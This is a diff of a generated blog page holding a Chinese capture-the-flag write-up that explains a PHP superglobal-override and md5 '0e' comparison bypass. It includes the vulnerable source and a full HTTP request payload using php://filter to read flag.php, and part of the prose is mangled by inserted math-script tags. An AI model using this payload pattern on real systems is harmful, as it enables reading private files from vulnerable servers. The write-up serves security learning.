@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,531</span> / Reading time: <span class="post-count">13 min</span></span>
+                        <span>Word count: <span class="post-count">2,522</span> / Reading time: <span class="post-count">12 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -448,7 +448,7 @@ height:50vh;
 <p>一会儿就看到了flag</p>
 <h2 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h2><p>源码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">        <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line"><span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'daiker'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'daiker'</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>看到关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">        <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></p>
-<p>发现这是Destoon 20140530最新版超全局变量覆盖导致的安全问题<br>分析如下：<br>这里的逻辑是 如果post get cookie请求中的$$key和$value相等 就unset掉$$key<br>如果我们向<code>index.php?x=123</code>提交一个POST请求内容为<code>_GET[x]=123</code><br>因为<code>?x=123</code><br>所以<code>$_GET</code>内容为<code>array(&#39;x&#39;=&gt;&#39;123&#39;)</code><br>当开始遍历<code>$_POST</code>的时候<code>$__k</code>是<code>_GET[x]</code><br>所以<code>$$__k</code>就是<code>$_GET[x]</code>也就是<code>array(&#39;x&#39;=&gt;&#39;123&#39;)</code><br><code>$__v</code>是POST上来的一个数组,内容也是<code>array(&#39;x&#39;=&gt;&#39;123&#39;)</code><br><code>$$__k == $__v</code>成立<br>所以我们的超全局变量<code>$_GET</code>就被unset了<br>由于我们的<code>$_GET</code>已经在前面被unset了 所以即使加了<code>EXTR_SKIP extract($_POST)</code>仍然能够正常的初始化<code>$_GET extract($_GET)</code>的值就成功绕过了waf的检查<br>然后我们就可以构造出2个0e开头的md5，成功文件包含，用php伪协议读取文件了！<br>我的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=php://filter/read=convert.base64-encode/resource=flag.php HTTP/1.1</span><br><span class="line">Host: 119.23.73.3:5101</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">_GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
+<p>发现这是Destoon 20140530最新版超全局变量覆盖导致的安全问题<br>分析如下：<br>这里的逻辑是 如果post get cookie请求中的<script type="math/tex">key和$value相等 就unset掉</script>key<br>如果我们向<code>index.php?x=123</code>提交一个POST请求内容为<code>_GET[x]=123</code><br>因为<code>?x=123</code><br>所以<code>$_GET</code>内容为<code>array(&#39;x&#39;=&gt;&#39;123&#39;)</code><br>当开始遍历<code>$_POST</code>的时候<code>$__k</code>是<code>_GET[x]</code><br>所以<code>$$__k</code>就是<code>$_GET[x]</code>也就是<code>array(&#39;x&#39;=&gt;&#39;123&#39;)</code><br><code>$__v</code>是POST上来的一个数组,内容也是<code>array(&#39;x&#39;=&gt;&#39;123&#39;)</code><br><code>$$__k == $__v</code>成立<br>所以我们的超全局变量<code>$_GET</code>就被unset了<br>由于我们的<code>$_GET</code>已经在前面被unset了 所以即使加了<code>EXTR_SKIP extract($_POST)</code>仍然能够正常的初始化<code>$_GET extract($_GET)</code>的值就成功绕过了waf的检查<br>然后我们就可以构造出2个0e开头的md5，成功文件包含，用php伪协议读取文件了！<br>我的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=php://filter/read=convert.base64-encode/resource=flag.php HTTP/1.1</span><br><span class="line">Host: 119.23.73.3:5101</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">_GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
 <p>发送即可得到flag</p>
 
     </article>
@@ -2954,9 +2954,23 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 135
+        Total : 137
         </div>
         <!-- search  -->
         
@@ -2969,6 +2983,16 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/Crypto之击破多层加密/" >Crypto之击破多层加密</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/RSA之拒绝套路(1)/" >RSA之拒绝套路(1)</a>
+        </li>
     
     
         <li class="archive-post-item">
